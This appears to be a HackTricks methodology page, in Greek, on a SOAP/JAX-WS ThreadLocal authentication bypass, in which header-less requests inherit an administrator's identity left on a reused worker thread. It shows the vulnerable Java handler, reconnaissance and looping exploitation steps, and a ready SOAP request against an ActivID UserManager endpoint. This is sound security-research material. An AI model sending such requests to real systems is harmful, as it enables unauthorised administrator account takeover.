# SOAP/JAX-WS ThreadLocal Authentication Bypass

{{#include ../banners/hacktricks-training.md}}

## TL;DR

- Ορισμένες αλυσίδες middleware αποθηκεύουν το επαληθευμένο `Subject`/`Principal` μέσα σε ένα static `ThreadLocal` και το ανανεώνουν μόνο όταν φτάσει ένα ιδιόκτητο SOAP header.
- Επειδή οι WebLogic/JBoss/GlassFish ανακυκλώνουν τους worker threads, η απουσία αυτού του header προκαλεί το τελευταίο προνομιούχο `Subject` που επεξεργάστηκε το thread να επαναχρησιμοποιηθεί σιωπηλά.
- Κατακλύστε το ευάλωτο endpoint με σωστά σχηματισμένα SOAP bodies χωρίς header, μέχρι ένα επαναχρησιμοποιημένο thread να σας χορηγήσει το κλεμμένο context του διαχειριστή.

## Βασική αιτία

Οι χειριστές παρόμοιοι με τον παρακάτω αντικαθιστούν την thread-local ταυτότητα μόνο όταν το custom header είναι παρόν, οπότε το context του προηγούμενου αιτήματος επιβιώνει:
```java
public boolean handleMessage(SOAPMessageContext ctx) {
if (!outbound) {
SOAPHeader hdr = ctx.getMessage().getSOAPPart().getEnvelope().getHeader();
SOAPHeaderElement e = findHeader(hdr, subjectName);
if (e != null) {
SubjectHolder.setSubject(unmarshal(e));
}
}
return true;
}
```
## Αναγνώριση

1. Καταγράψτε τους κανόνες reverse proxy / δρομολόγησης για να εντοπίσετε κρυφά SOAP δέντρα που μπορεί να μπλοκάρουν `?wsdl` αλλά να δέχονται POSTs (σχεδιάστε τα παράλληλα με τη ροή στο [80,443 - Pentesting Web Methodology](../network-services-pentesting/pentesting-web/README.md)).
2. Αποσυμπιέστε τα EAR/WAR/EJB artifacts (`unzip *.ear`) και ελέγξτε τα `application.xml`, `web.xml`, `@WebService` annotations και τα handler chains (π.χ., `LoginHandlerChain.xml`) για να αποκαλύψετε την κλάση handler, το SOAP header QName και τα ονόματα των υποστηρικτικών EJB.
3. Εάν λείπει metadata, brute-force πιθανές διαδρομές `ServiceName?wsdl` ή χαλαρώστε προσωρινά τους lab proxies, και εισάγετε οποιοδήποτε ανακτηθέν WSDL σε εργαλεία όπως [Burp Suite Wsdler](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f) για να δημιουργήσετε baseline envelopes.
4. Εξετάστε τον κώδικα των handlers για `ThreadLocal` keepers (π.χ., `SubjectHolder.setSubject()`) που δεν καθαρίζονται ποτέ όταν το authentication header λείπει ή είναι malformed.

## Εκμετάλλευση

1. Στείλτε ένα έγκυρο request **με** το ιδιόκτητο header για να μάθετε τους κανονικούς κωδικούς απόκρισης και τυχόν σφάλματα που χρησιμοποιούνται για invalid tokens.
2. Επαναστείλτε το ίδιο SOAP body παραλείποντας το header. Κρατήστε το XML well-formed και σεβαστείτε τα απαιτούμενα namespaces ώστε ο handler να τερματίζει καθαρά.
3. Κάντε loop στο request· όταν προσγειωθεί σε ένα thread που προηγουμένως εκτέλεσε privileged action, το επαναχρησιμοποιημένο `Subject` ξεκλειδώνει προστατευμένες λειτουργίες όπως user ή credential managers.
```http
POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1
Host: target
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
<soapenv:Header/>
<soapenv:Body>
<jax:findUserIds>
<arg0></arg0>
<arg1>spl*</arg1>
</jax:findUserIds>
</soapenv:Body>
</soapenv:Envelope>
```
## Επαλήθευση του Σφάλματος

- Συνδέστε το JDWP (`-agentlib:jdwp=transport=dt_socket,server=y,address=5005,suspend=n`) ή παρόμοια debugging hooks για να παρακολουθήσετε τα περιεχόμενα του `ThreadLocal` πριν και μετά από κάθε κλήση, επιβεβαιώνοντας ότι ένα μη-πιστοποιημένο αίτημα κληρονόμησε έναν προηγούμενο διαχειριστή `Subject`.

## Αναφορές

- [Synacktiv – ActivID administrator account takeover: the story behind HID-PSA-2025-002](https://www.synacktiv.com/publications/activid-administrator-account-takeover-the-story-behind-hid-psa-2025-002.html)
- [PortSwigger – Wsdler (WSDL parser) extension](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f)

{{#include ../banners/hacktricks-training.md}}
